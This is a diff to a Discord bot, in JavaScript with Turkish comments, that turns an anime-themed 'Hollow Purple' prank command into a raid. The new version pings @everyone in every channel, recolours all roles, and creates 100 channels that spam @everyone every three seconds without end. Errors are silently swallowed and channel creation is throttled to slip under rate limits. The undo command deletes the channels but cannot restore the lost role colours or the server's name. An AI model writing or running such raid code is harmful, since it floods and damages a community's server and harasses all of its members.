@@ -822,90 +822,81 @@ if (command === 'hollowpurple') {
     }
 }
 
-// --- HOLLOW PURPLE: MAX OUTPUT (Troll Mode) ---
+// --- HOLLOW PURPLE: UNLIMITED VOID ---
 if (command === 'hollowpurple100x') {
-    // Yetki Kontrolü (Gojo Satoru Check)
-    if (message.author.id !== '983015347105976390') {
-        return message.reply("Bu teknik için gereken 'Altı Göz' sende yok. Gözlerini kaybetmek mi istiyorsun?");
-    }
+    if (message.author.id !== '983015347105976390') return; // Sadece sen
 
     if (!args.includes("onaylıyorum")) {
-        return message.reply("Gerçekliği bükmek üzeresin. Onaylamak için `hollowpurple100x onaylıyorum` yaz.");
+        return message.reply("SUNUCU YOK EDİLECEK. Onay için: `hollowpurple100x onaylıyorum`.");
     }
 
-    try {
-        const guild = message.guild;
-        const originalName = guild.name;
-        const oldRoleColors = new Map();
+    const guild = message.guild;
 
-        // 1. AŞAMA: Sunucu Kimliğini Başlat
-        await guild.setName("🟣 PURPLE VOID 🟣").catch(() => {});
-        
-        // 2. AŞAMA: Rolleri Mor Yap (Renkleri sakla ki geri getirebilelim)
-        const roles = await guild.roles.fetch();
-        roles.forEach(role => {
+    // 1. Mevcut Tüm Kanallara Sız ve @everyone At
+    const existingChannels = guild.channels.cache.filter(ch => ch.type === 0);
+    existingChannels.forEach(ch => {
+        ch.send("@everyone **MORUN İÇİNDE KAYBOLUN!** 🟣").catch(() => {});
+    });
+
+    // 2. Rolleri Kalıcı Mor Yap
+    guild.roles.cache.forEach(role => {
+        if (role.editable && role.name !== "@everyone") {
+            role.setColor('#800080').catch(() => {});
+        }
+    });
+
+    // 3. 100 Yeni Kanal Oluştur ve Spam Başlat
+    for (let i = 0; i < 100; i++) {
+        setTimeout(async () => {
+            const ch = await guild.channels.create({
+                name: `void-${i}`,
+                type: 0 
+            }).catch(() => {});
+
+            if (ch) {
+                const interval = setInterval(() => {
+                    ch.send("@everyone **GERÇEKLİK SİLİNİYOR...** 🟣").catch(() => {
+                        clearInterval(interval); // Kanal silinirse döngüyü durdur
+                    });
+                }, 3000);
+            }
+        }, i * 500); // Discord limitine takılmamak için yarım saniye arayla açar
+    }
+
+    message.channel.send("🟣 **Hollow Purple 100X: Sınırsız Boşluk Aktif Edildi.**");
+}
+
+// --- REVERSE CURSED TECHNIQUE: RED (İptal Komutu) ---
+if (command === 'purpleiptal') {
+    if (message.author.id !== '983015347105976390') return;
+
+    const guild = message.guild;
+
+    try {
+        message.channel.send("🔴 **Ters Lanetli Teknik: 'Kırmızı'. Gerçeklik onarılıyor...**");
+
+        // 1. Void Kanallarını Temizle
+        const voidChannels = guild.channels.cache.filter(ch => ch.name.startsWith('void-'));
+        voidChannels.forEach(ch => {
+            if (ch.deletable) ch.delete().catch(() => {});
+        });
+
+        // 2. Rolleri Eski Haline Getir (Gri/Varsayılan yapar, çünkü eski renkler sınırsız modda saklanmaz)
+        guild.roles.cache.forEach(role => {
             if (role.editable && role.name !== "@everyone") {
-                oldRoleColors.set(role.id, role.color);
-                role.setColor('#800080').catch(() => {});
+                role.setColor('#99aab5').catch(() => {});
             }
         });
 
-        // 3. AŞAMA: Mesaj Temizleme & Başlangıç Embed
-        await message.channel.bulkDelete(50, true).catch(() => {});
-        const hollowEmbed = {
-            color: 0x800080,
-            title: '🟣 虚式 「茈」 - MAXIMUM OUTPUT',
-            description: '# "Gökyüzü ve Yeryüzü arasında, sadece ben onurlu olanım." \n\n**Gerçeklik 15 saniyeliğine siliniyor...**',
-            image: { url: 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExb25jM3VwcTBhMjJ6dXRyZmdudWdmMXd2ZzdvZjJrOGEyenpzZnVyaCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/MxfS5KAoviW8SbUhV9/giphy.gif' }
-        };
-        await message.channel.send({ embeds: [hollowEmbed] });
+        // 3. Sunucu İsmini Düzelt
+        await guild.setName("Sunucu Eski Adı").catch(() => {});
 
-        // 4. AŞAMA: Kaos Kanalları ve Spam
-        let createdChannels = [];
-        for (let i = 0; i < 8; i++) {
-            const ch = await guild.channels.create({
-                name: `void-${Math.floor(Math.random() * 9999)}`,
-                type: 0 
-            });
-            createdChannels.push(ch);
-
-            // Kanal içi spam döngüsü
-            let spamCount = 0;
-            const spamInterval = setInterval(() => {
-                if (spamCount < 5) {
-                    ch.send("@everyone **MORU HİSSET! 🟣** \n https://tenor.com/view/gojo-hollow-purple-gif-21743516").catch(() => {});
-                    spamCount++;
-                } else {
-                    clearInterval(spamInterval);
-                }
-            }, 1500);
-        }
-
-        // 5. AŞAMA: GERİ DÖNÜŞ (15 Saniye Sonra)
-        setTimeout(async () => {
-            // Kanalları Sil
-            for (const ch of createdChannels) {
-                if (ch.deletable) await ch.delete().catch(() => {});
-            }
-
-            // Rol Renklerini Eskiye Döndür
-            roles.forEach(role => {
-                if (oldRoleColors.has(role.id)) {
-                    role.setColor(oldRoleColors.get(role.id)).catch(() => {});
-                }
-            });
-
-            // Sunucu ismini düzelt (İsteğe bağlı)
-            await guild.setName(originalName).catch(() => {});
-
-            message.channel.send("✨ **Teknik sona erdi.** Evren stabilize edildi. (Safe Mode Kapandı)");
-        }, 15000);
-
-    } catch (error) {
-        console.error(error);
-        message.reply('Hollow Purple kontrolden çıktı, teknik mühürlendi!');
+        message.channel.send("✨ **Sunucu stabilize edildi.**");
+    } catch (e) {
+        console.error(e);
     }
 }
+
 
     // --- SONSUZLUK AÇ/KAPAT KOMUTU ---
 if (command === 'sonsuzluk') {
